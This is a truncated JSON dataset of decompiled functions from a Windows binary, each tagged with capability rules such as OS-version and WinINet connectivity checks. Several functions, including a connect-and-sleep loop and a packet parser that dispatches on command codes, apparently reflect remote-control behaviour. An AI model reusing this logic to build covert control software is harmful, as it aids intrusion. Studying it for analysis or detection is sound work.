{
    "00401000": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401000(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    // [00] -r-x section size 77824 named .text\n    if (arg_10h != 0) {\n        for (; (arg_10h = arg_10h + -1,  arg_10h != 0 && (*arg_8h == *arg_ch)); arg_8h = arg_8h + 1) {\n            arg_ch = arg_ch + 1;\n        }\n        return *arg_8h - *arg_ch;\n    }\n    return 0;\n}\n",
        "token_count": 148
    },
    "0040102c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040102c(uchar *arg_8h, uchar *arg_ch, int32_t arg_10h)\n\n{\n    uchar *puVar1;\n    \n    puVar1 = arg_8h;\n    if (arg_10h != 0) {\n        do {\n            arg_10h = arg_10h + -1;\n            *puVar1 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            puVar1 = puVar1 + 1;\n        } while (arg_10h != 0);\n    }\n    return arg_8h;\n}\n",
        "token_count": 135
    },
    "004010d5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint16_t * fcn.004010d5(int16_t *param_1, int16_t *param_2)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int32_t iVar3;\n    \n    if (*param_2 != 0) {\n        iVar1 = *param_1;\n        if (iVar1 != 0) {\n            iVar3 = param_1 - param_2;\n            piVar2 = param_2;\njoined_r0x004010fb:\n            do {\n                if (iVar1 != 0) {\n                    if (*piVar2 == 0) {\n                        return param_1;\n                    }\n                    if (*(iVar3 + piVar2) == *piVar2) {\n                        iVar1 = *(iVar3 + piVar2 + 1);\n                        piVar2 = piVar2 + 1;\n                        goto joined_r0x004010fb;\n                    }\n                }\n                if (*piVar2 == 0) {\n                    return param_1;\n                }\n                param_1 = param_1 + 1;\n                iVar1 = *param_1;\n                iVar3 = iVar3 + 2;\n                piVar2 = param_2;\n            } while (iVar1 != 0);\n        }\n        param_1 = NULL;\n    }\n    return param_1;\n}\n",
        "token_count": 289
    },
    "00401f2c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401f2c(int32_t **param_1)\n\n{\n    if ((**param_1 != 0) && (*(param_1 + 1) != '\\0')) {\n        fcn.00401099(**param_1);\n        **param_1 = 0;\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "00401f76": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401f76(int32_t *param_1)\n\n{\n    if (*param_1 != 0) {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*param_1, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*param_1);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 83
    },
    "00402190": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402190(uint dwMilliseconds)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    if (*in_ECX != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*in_ECX, dwMilliseconds);\n        if (iVar1 != 0) {\n            return 0;\n        }\n        *in_ECX = 0;\n        in_ECX[1] = 0;\n    }\n    return 1;\n}\n",
        "token_count": 113
    },
    "0040256e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040256e(int32_t *param_1)\n\n{\n    uint unaff_ESI;\n    \n    if (param_1[4] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(param_1[4]);\n    }\n    fcn.00405ea5();\n    if (*param_1 != 0) {\n        fcn.00405eee(unaff_ESI);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 109
    },
    "00402a10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402a10(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    param_2 = param_2 + 4;\n    uVar2 = fcn.004033bf(\"start\");\n    iVar3 = fcn.004033a3(uVar2);\n    if ((iVar3 == 0) || (*0x41957c != 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    fcn.00405ea5();\n    if (bVar1) {\n        fcn.0040edb5(param_1);\n    }\n    else {\n        uVar2 = fcn.004033bf(\"exit\");\n        iVar3 = fcn.004033a3(uVar2);\n        fcn.00405ea5();\n        if (iVar3 == 0) {\n            fcn.004033f5(param_2);\n            fcn.0040ecd0(param_2);\n        }\n        else {\n            *0x41957c = 0;\n            fcn.0040ea89();\n        }\n    }\n    return;\n}\n",
        "token_count": 273
    },
    "0040308c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040308c(int32_t *param_1)\n\n{\n    uint uVar1;\n    \n    if (*param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*param_1);\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 73
    },
    "00403125": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403125(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    fcn.00405ea5();\n    *in_ECX = 0;\n    if (*arg_8h != 0) {\n        fcn.00403372();\n        uVar1 = fcn.00405e22();\n        *in_ECX = uVar1;\n        (*_sym.imp.KERNEL32.dll_lstrcatA)(uVar1, *arg_8h);\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "00403261": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403261(int32_t *param_1)\n\n{\n    uint uVar1;\n    \n    if (*param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*param_1);\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 72
    },
    "00403372": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403372(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*param_1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*param_1);\n        return iVar1 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 76
    },
    "00403384": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403384(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*param_1 == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*param_1);\n    return iVar1 * 2 + 2;\n}\n",
        "token_count": 79
    },
    "004033f5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004033f5(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    *in_ECX = 0;\n    if (*arg_8h != 0) {\n        fcn.00403372();\n        uVar1 = fcn.00405eb4();\n        *in_ECX = uVar1;\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(uVar1, *arg_8h);\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "00403437": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403437(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    *in_ECX = 0;\n    if (*arg_8h != 0) {\n        fcn.00403384();\n        uVar1 = fcn.00405e22();\n        *in_ECX = uVar1;\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar1, *arg_8h);\n    }\n    return;\n}\n",
        "token_count": 115
    },
    "0040351d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040351d(uint arg_8h)\n\n{\n    uint lpString2;\n    int32_t *in_ECX;\n    \n    if (*in_ECX == 0) {\n        lpString2 = 0;\n    }\n    else {\n        lpString2 = (*_sym.imp.SHLWAPI.dll_PathFindExtensionW)(*in_ECX);\n    }\n    fcn.004035e5(lpString2);\n    return arg_8h;\n}\n",
        "token_count": 103
    },
    "0040362d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040362d(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    *in_ECX = 0;\n    if (*arg_8h != 0) {\n        fcn.00403261();\n        uVar1 = fcn.00405eb4();\n        *in_ECX = uVar1;\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar1, *arg_8h);\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "004038de": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004038de(int32_t *arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint var_8h;\n    \n    *(in_ECX + 4) = **arg_8h;\n    *(in_ECX + 8) = *(*arg_8h + 4) != '\\0';\n    arg_8h_00 = fcn.00402e4c(&var_8h, 9, *(*arg_8h + 5));\n    fcn.00402e93(arg_8h_00);\n    fcn.00403036();\n    return;\n}\n",
        "token_count": 145
    },
    "00404e5b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404e5b(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *arg_8h;\n    uchar *hostshort;\n    uchar auStack48 [4];\n    uint uStack44;\n    uint var_10h;\n    uint var_8h;\n    \n    *(param_1 + 0x240) = 1;\n    do {\n        uStack44 = 0x404e81;\n        iVar1 = fcn.00405c6d(&fcn.00404e5b::var_10h);\n        uStack44 = *(iVar1 + 4);\n        arg_8h = &fcn.00404e5b::var_8h;\n        hostshort = &stack0xffffffd0;\n        fcn.00405c6d(arg_8h);\n        fcn.00403554(arg_8h);\n        iVar1 = fcn.004057fb(arg_8h, hostshort);\n        fcn.00405ea5();\n        var_8h = 0;\n        fcn.00405ea5();\n        var_10h = 0;\n        if (iVar1 != 0) {\n            fcn.0040562f(param_1);\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(*(param_1 + 0x210));\n    } while (*(param_1 + 0x240) != 0);\n    return;\n}\n",
        "token_count": 316
    },
    "00404f65": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404f65(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t in_ECX;\n    int32_t *piVar4;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    \n    iVar2 = *(in_ECX + 0x18);\n    var_8h = in_ECX;\n    if (iVar2 == 0) {\n        if (*(in_ECX + 0x14) < 0xc) {\n            return;\n        }\n        piVar4 = *(in_ECX + 0x10);\n        if (*piVar4 != -0x1b9944d7) {\n            fcn.00402fc3();\n            iVar2 = *(in_ECX + 0x18);\n            goto code_r0x00404faf;\n        }\n        *(in_ECX + 0x28) = piVar4[1];\n        *(in_ECX + 0x2c) = piVar4[2];\n        *(in_ECX + 0x18) = 1;\n    }\n    else {\ncode_r0x00404faf:\n        if (iVar2 != 1) {\n            return;\n        }\n    }\n    var_10h = *(in_ECX + 0x14) - 0xc;\n    if (var_10h < *(in_ECX + 0x28)) {\n        return;\n    }\n    fcn.00402f91(*(in_ECX + 0x10) + 0xc, *(in_ECX + 0x28));\n    uVar1 = *(in_ECX + 0x2c);\n    piVar4 = NULL;\n    if (uVar1 < 0x23) {\n        if (uVar1 == 0x22) {\n            piVar4 = fcn.00405f53();\n            if (piVar4 != NULL) {\n                *piVar4 = 0x4146e0;\ncode_r0x00405041:\n                piVar4[1] = 0;\n                goto code_r0x004054b8;\n            }\n            goto code_r0x004054b6;\n        }\n        if (0x10 < uVar1) {\n            if (uVar1 < 0x1b) {\n                if (uVar1 == 0x1a) {\n                    piVar4 = fcn.00405f53();\n                    if (piVar4 == NULL) goto code_r0x004054b6;\n                    *piVar4 = 0x414790;\n                }\n                else if (uVar1 == 0x12) {\n                    piVar4 = fcn.00405f53();\n                    if (piVar4 == NULL) goto code_r0x004054b6;\n                    *piVar4 = 0x414730;\n                }\n                else if (uVar1 == 0x14) {\n                    piVar4 = fcn.00405f53();\n                    if (piVar4 == NULL) goto code_r0x004054b6;\n                    *piVar4 = 0x414778;\n                }\n                else if (uVar1 == 0x16) {\n                    piVar4 = fcn.00405f53();\n                    if (piVar4 == NULL) goto code_r0x004054b6;\n                    *piVar4 = 0x414788;\n                }\n                else {\n                    if (uVar1 != 0x18) goto code_r0x004054c0;\n                    piVar4 = fcn.00405f53();\n                    if (piVar4 == NULL) goto code_r0x004054b6;\n                    *piVar4 = 0x414738;\n                }\n            }\n            else if (uVar1 == 0x1c) {\n                piVar4 = fcn.00405f53();\n                if (piVar4 == NULL) goto code_r0x004054b6;\n                *piVar4 = 0x414798;\n                piVar4[2] = 0;\n                piVar4[5] = 0;\n                piVar4[6] = 0;\n            }\n            else if (uVar1 == 0x1e) {\n                piVar4 = fcn.00405f53();\n                if (piVar4 == NULL) goto code_r0x004054b6;\n                *piVar4 = 0x414758;\ncode_r0x0040524b:\n                piVar4[3] = 0;\n                piVar4[4] = 0;\n            }\n            else {\n                if (uVar1 != 0x20) goto code_r0x004054c0;\n                piVar4 = fcn.00405f53();\n                if (piVar4 == NULL) goto code_r0x004054b6;\n                *piVar4 = 0x414720;\n            }\n            goto code_r0x004054b8;\n        }\n        if (uVar1 == 0x10) {\n            piVar4 = fcn.00405f53();\n            if (piVar4 != NULL) {\n                piVar4[1] = -1;\n                *piVar4 = 0x414640;\n                goto code_r0x004054b8;\n            }\n            goto code_r0x004054b6;\n        }\n        if (uVar1 < 9) {\n            if (uVar1 == 8) {\n                piVar4 = fcn.00405f53();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x4146e8;\n                    goto code_r0x004050b9;\n                }\n            }\n            else if (uVar1 == 0) {\n                piVar4 = fcn.00405f53();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x4146f8;\n                    goto code_r0x004054b8;\n                }\n            }\n            else if (uVar1 == 2) {\n                piVar4 = fcn.00405f53();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x414728;\n                    goto code_r0x004054b8;\n                }\n            }\n            else if (uVar1 == 4) {\n                piVar4 = fcn.00405f53();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x414718;\n                    goto code_r0x004054b8;\n                }\n            }\n            else {\n                if (uVar1 != 6) goto code_r0x004054c0;\n                piVar4 = fcn.00405f53();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x414710;\n                    goto code_r0x00405041;\n                }\n            }\n            goto code_r0x004054b6;\n        }\n        if (uVar1 == 10) {\n            piVar4 = fcn.00405f53();\n            if (piVar4 != NULL) {\n                *piVar4 = 0x4146d8;\n                goto code_r0x00405041;\n            }\n            goto code_r0x004054b6;\n        }\n        if (uVar1 == 0xc) {\n            piVar4 = fcn.00405f53();\n            if (piVar4 == NULL) goto code_r0x004054b6;\n            *piVar4 = 0x414708;\n        }\n        else {\n            if (uVar1 != 0xe) goto code_r0x004054c0;\n            iVar2 = fcn.00405f53();\n            if (iVar2 == 0) goto code_r0x004054b6;\n            piVar4 = fcn.00403cd3();\n        }\n    }\n    else {\n        if (uVar1 < 0x37) {\n            if (uVar1 != 0x36) {\n                if (uVar1 < 0x2d) {\n                    if (uVar1 != 0x2c) {\n                        if (uVar1 == 0x24) {\n                            piVar4 = fcn.00405f53();\n                            if (piVar4 == NULL) goto code_r0x004054b6;\n                            *piVar4 = 0x414768;\n                        }\n                        else if (uVar1 == 0x26) {\n                            piVar4 = fcn.00405f53();\n                            if (piVar4 == NULL) goto code_r0x004054b6;\n                            *piVar4 = 0x414780;\n                        }\n                        else {\n                            if (uVar1 != 0x28) {\n                                if (uVar1 != 0x2a) goto code_r0x004054c0;\n                                puVar3 = fcn.00405f53();\n                                if (puVar3 == NULL) goto code_r0x004052f0;\n                                *puVar3 = 0x4147a0;\n                                puVar3[1] = 0x4147a8;\n                                goto code_r0x004052f2;\n                            }\n                            piVar4 = fcn.00405f53();\n                            if (piVar4 == NULL) goto code_r0x004054b6;\n                            *piVar4 = 0x414770;\n                        }\n                        goto code_r0x004054b8;\n                    }\n                    puVar3 = fcn.00405f53();\n                    if (puVar3 == NULL) {\ncode_r0x004052f0:\n                        puVar3 = NULL;\n                    }\n                    else {\n                        *puVar3 = 0x4147c8;\n                        puVar3[1] = 0x4147c0;\n                    }\n                }\n                else {\n                    if (uVar1 != 0x2e) {\n                        if (uVar1 == 0x30) {\n                            piVar4 = fcn.00405f53();\n                            if (piVar4 == NULL) goto code_r0x004054b6;\n                            *piVar4 = 0x41752c;\n                        }\n                        else {\n                            if (uVar1 != 0x32) goto code_r0x004054c0;\n                            piVar4 = fcn.00405f53();\n                            if (piVar4 == NULL) goto code_r0x004054b6;\n                            *piVar4 = 0x417534;\n                        }\n                        goto code_r0x004054b8;\n                    }\n                    iVar2 = fcn.00405f53();\n                    if (iVar2 == 0) goto code_r0x004052f0;\n                    puVar3 = fcn.00403f02();\n                }\ncode_r0x004052f2:\n                piVar4 = -(puVar3 != NULL) & puVar3 + 1;\n                goto code_r0x004054b8;\n            }\n            piVar4 = fcn.00405f53();\n            if (piVar4 != NULL) {\n                *piVar4 = 0x417484;\n                goto code_r0x00405041;\n            }\n        }\n        else if (uVar1 == 0x38) {\n            piVar4 = fcn.00405f53();\n            if (piVar4 != NULL) {\n                *piVar4 = 0x414748;\n                goto code_r0x004054b8;\n            }\n        }\n        else if (uVar1 == 0x3a) {\n            piVar4 = fcn.00405f53();\n            if (piVar4 != NULL) {\n                *piVar4 = 0x417420;\ncode_r0x004050b9:\n                piVar4[2] = 0;\n                goto code_r0x004054b8;\n            }\n        }\n        else if (uVar1 == 0x3c) {\n            piVar4 = fcn.00405f53();\n            if (piVar4 != NULL) {\n                *piVar4 = 0x41751c;\n                goto code_r0x004054b8;\n            }\n        }\n        else {\n            if (uVar1 == 0x3e) {\n                fcn.00411a3c();\n                goto code_r0x004054c0;\n            }\n            if (uVar1 == 0x40) {\n                fcn.00411ab9();\n                goto code_r0x004054c0;\n            }\n            if (uVar1 == 0x48) {\n                piVar4 = fcn.00405f53();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x414700;\n                    goto code_r0x0040524b;\n                }\n            }\n            else {\n                if (uVar1 != 0x4a) goto code_r0x004054c0;\n                piVar4 = fcn.00405f53();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x417454;\n                    goto code_r0x004050b9;\n                }\n            }\n        }\ncode_r0x004054b6:\n        piVar4 = NULL;\n    }\ncode_r0x004054b8:\n    (**(*piVar4 + 4))(in_ECX + 0x30);\ncode_r0x004054c0:\n    (***arg_8h)(*(var_8h + 0x2c), piVar4);\n    if (var_10h < *(var_8h + 0x28) || var_10h == *(var_8h + 0x28)) {\n        fcn.00402fc3();\n    }\n    else {\n        fcn.0040304c(var_8h + 0x10);\n        fcn.00402e4c(&var_14h, *(var_8h + 0x28) + 0xc, (*(var_8h + 0x14) - *(var_8h + 0x28)) + -0xc);\n        fcn.00402e93(&var_14h);\n        *(var_8h + 0x18) = 0;\n        fcn.00404f65(arg_8h);\n        fcn.00403036();\n        fcn.00403036();\n    }\n    if (*(var_8h + 0x34) != 0) {\n        fcn.00402fc3();\n    }\n    *(var_8h + 0x18) = 0;\n    return;\n}\n",
        "token_count": 3222
    },
    "00405911": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405911(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint var_8h;\n    \n    if (*(in_ECX + 4) == 0) {\n        arg_8h_00 = fcn.00402e4c(&var_8h, 4, **(in_ECX + 0x48));\n        fcn.00402e93(arg_8h_00);\n        fcn.00403036();\n        *(in_ECX + 4) = 1;\n    }\n    fcn.0040304c(in_ECX + 8);\n    return arg_8h;\n}\n",
        "token_count": 154
    },
    "00405f31": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405f31(int32_t arg_8h)\n\n{\n    if (arg_8h != 0) {\n        fcn.00401052();\n    }\n    return;\n}\n",
        "token_count": 46
    },
    "004073bb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004073bb(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint unaff_EBX;\n    uint32_t arg_8h_00;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint in_stack_ffffff84;\n    uint uVar4;\n    uint in_stack_ffffff88;\n    uint in_stack_ffffff8c;\n    int32_t iStack72;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint32_t uStack24;\n    \n    uVar2 = *(arg_8h + 0x14);\n    fcn.004035e5(uVar2);\n    fcn.004078b0(uVar2);\n    if (iStack72 == 0) {\n        uVar4 = 0;\n        uVar3 = 0;\n        uVar2 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)\n                          (*(arg_8h + 0x14), extraout_ECX, uStack32, 0, 0, 0, &stack0xffffff84, 2);\n        fcn.004035e5(uVar2);\n        uVar2 = fcn.004040ea(*(arg_8h + 0x18), uVar2, unaff_EDI, unaff_ESI, unaff_EBX, uVar4, uVar3, in_stack_ffffff8c);\n        fcn.00404f2b(uVar2);\n        fcn.00404050();\n        fcn.00403036();\n    }\n    else {\n        arg_8h_00 = 0;\n        if (uStack24 != 0) {\n            do {\n                uVar2 = 0;\n                if (*(*(arg_8h + 4) + 0xc) == 0) break;\n                uVar4 = uVar2;\n                uVar3 = uVar2;\n                iVar1 = fcn.0040783b(arg_8h_00, &stack0xffffff7c);\n                if (iVar1 == 0) {\n                    uVar4 = uVar2;\n                    uVar3 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)\n                                      (*(arg_8h + 0x14), extraout_ECX_00, uStack40, 0, 0, 0, &stack0xffffff7c, 1);\n                    fcn.004035e5(uVar3);\n                    uVar2 = fcn.004040ea(*(arg_8h + 0x18), uVar3, unaff_EDI, uVar2, uVar4, in_stack_ffffff84, \n                                         in_stack_ffffff88, in_stack_ffffff8c);\n                    fcn.00404f2b(uVar2);\n                    fcn.00404050();\n                    fcn.00403036();\n                }\n                else {\n                    uVar2 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)\n                                      (*(arg_8h + 0x14), extraout_ECX_00, uStack40, arg_8h_00, uStack32, uStack36, \n                                       &stack0xffffff74, 0);\n                    fcn.004035e5(uVar2);\n                    uVar2 = fcn.004040ea(*(arg_8h + 0x18), uVar2, unaff_EDI, uVar4, uVar3, in_stack_ffffff84, \n                                         in_stack_ffffff88, in_stack_ffffff8c);\n                    fcn.00404f2b(uVar2);\n                    fcn.00404050();\n                }\n                fcn.00403036();\n                arg_8h_00 = arg_8h_00 + 1;\n            } while (arg_8h_00 < uStack24);\n        }\n    }\n    if (iStack72 != 0) {\n        fcn.00410125();\n    }\n    fcn.00407574(*(arg_8h + 4), *(arg_8h + 0x18), 0);\n    fcn.004077e3();\n    fcn.00403036();\n    return 0;\n}\n",
        "token_count": 946
    },
    "00407574": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
